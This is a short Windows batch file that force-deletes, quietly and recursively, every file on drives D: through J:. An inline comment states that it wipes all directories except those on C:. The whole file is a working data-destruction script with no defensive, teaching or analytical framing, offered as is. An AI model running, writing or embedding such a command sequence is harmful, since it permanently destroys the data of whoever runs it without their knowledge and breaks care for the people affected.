@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q                                              --------------------->deletes all directories(Except C drive)
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q


